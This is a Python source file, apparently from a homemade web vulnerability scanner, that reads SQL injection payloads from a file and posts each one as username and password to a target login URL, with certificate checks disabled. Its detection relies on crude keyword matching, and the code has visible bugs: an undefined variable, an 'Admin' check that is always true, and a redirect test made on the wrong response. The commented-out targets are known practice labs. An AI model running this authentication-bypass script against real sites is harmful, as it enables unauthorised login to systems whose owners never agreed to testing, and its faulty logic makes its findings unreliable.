import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
# import sock
# from database import create_database_for_Captures
import sqlite3


############################################################################
attack_type = "authentication bypass SQL injection"
#############################################################################

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""



####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
########################################


#



async def auth_SQL_inj(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        global pattern,htmlpattern #* use these two variables as 
        done = False #* Set done flag as false
        filename = "auth_bypass.txt" #* opens the file of the sqlinjection payload
        current_directory = os.path.dirname(os.path.abspath(__file__)) #* get the current file and directory
        file_path = os.path.join(current_directory, filename) #* Get the file path

        with open(file_path, "r") as file: #* Opens the file path as read mode
            payload = file.read() #* read the file
            rows = payload.split("\n") #* split the rows
            sorted_rows = sorted(rows) #* Sort the rows
            sorted_payload = "\n".join(sorted_rows) #* Jions within the program
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) #* Prints the payload
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False) #* Sends a request and set the verify flag as false
            if req.status_code == 200: #* If the host is up we inform the user
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the ip address: {urls} Do you want to send the payload to the website? ")

                if ask.lower() == "y": #* if y
                    for line in sorted_payload.split("\n"): #* Create a for loop in the program
                        #############################################################33
                        params = { #* set parameters
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        # print(line)
                        ack = requests.post(url=urls, data=params,verify=False) #* send a post requests with a payload
                        print(f"[{datetime.now()}]","|Current payload: |", line ,"|with status code|:",ack.status_code) #* prints the current status code with its payload
                        # print(f"[{datetime.now()}]",Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5) #! This prevent the program from crashing 
                        if "error" in ack.text: #* if the error word was in the test result we inform the user
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text)
                            
                        vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) #* use regex patterns for the better searching
                        htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                        if vuln: #* if the regex pattern founds we inform the user
                            print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found Status: |", ack.text," | with the count of: |",len(vuln),"|Attack:|"+"|authentication bypass SQL injection|")
                            await asyncio.sleep(3) #* Stop the program for 5 sec
                        
                        if htmlVULN:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found:|", ack.text,"|with the count of|:",len(htmlVULN))
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text #* inform the user the other results
                        errword = "error" in req.text
                        if word:
                            print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found with the rows Status:|:", word if word is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection")
                            await asyncio.sleep(3)
                        
                        if errword:
                            print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection")
                            await asyncio.sleep(3)
                            
                        
                            
                    if req.status_code == 302: #*If could even break to the website we inform the user
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection")
                        done = True
                    
                    if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                        print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection")
                        
            else:
                print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection")
                
        # capturesAUTHBYPASS.append(str(htmlVULN))
        # capturesAUTHBYPASS.append(str(vuln))
        # await create_database_for_Captures()
        conn = sqlite3.connect("ResultCap.db")
        cur = conn.cursor()

        sql = "INSERT INTO Datas (Data) VALUES (?)"
        values = [(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]

        cur.executemany(sql, values)

        conn.commit()
        conn.close()
        
                        
                    
    except Exception as e:
        print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
        
    except KeyboardInterrupt:
        # print(f"[{datetime.now()}]","Exiting...")
        pass
        
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection aborted error:",e,"|Attack:|",attack_type)
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection error:",e,"|Attack:|",attack_type)
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection refused error:",e,"|Attack:|",attack_type)
        
    except ConnectionResetError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection reset error:",e,"|Attack:|",attack_type)
        
    except UnicodeEncodeError:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] UnicodeEncodeError:",e,"|Attack:|",attack_type)
        
    except MemoryError:
        import psutil
        # Get the system memory information
        memory = psutil.virtual_memory()

        # Calculate the threshold for 80% memory usage
        threshold = memory.total * 0.9

        # Check if the used memory is greater than the threshold
        Err =  memory.used <= threshold
        while not Err:
            memory = psutil.virtual_memory()
            Err = memory.used <= threshold
            print(Fore.RED+"[INFO]Please Release you RAM space to continue the application"+"|Attack:|",attack_type)
            await asyncio.sleep(5)
# asyncio.run(Memory_handling())
        
    finally:
        pass
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #             \n{ack.text}\n     """)
        # capturesAUTHBYPASS.append(ack.text)
        
        
# asyncio.run(auth_SQL_inj(["http://testfire.net/login.jsp"]))
# asyncio.run(auth_SQL_inj("https://redtiger.labs.overthewire.org/"))
# url = "https://redtiger.labs.overthewire.org/"
# asyncio.run(auth_SQL_inj(url))
# if __name__ != "main":
#     pass      

async def auth_main(urL):
    await auth_SQL_inj(urL)

# asyncio.run(auth_main("https://redtiger.labs.overthewire.org/level1.php"))
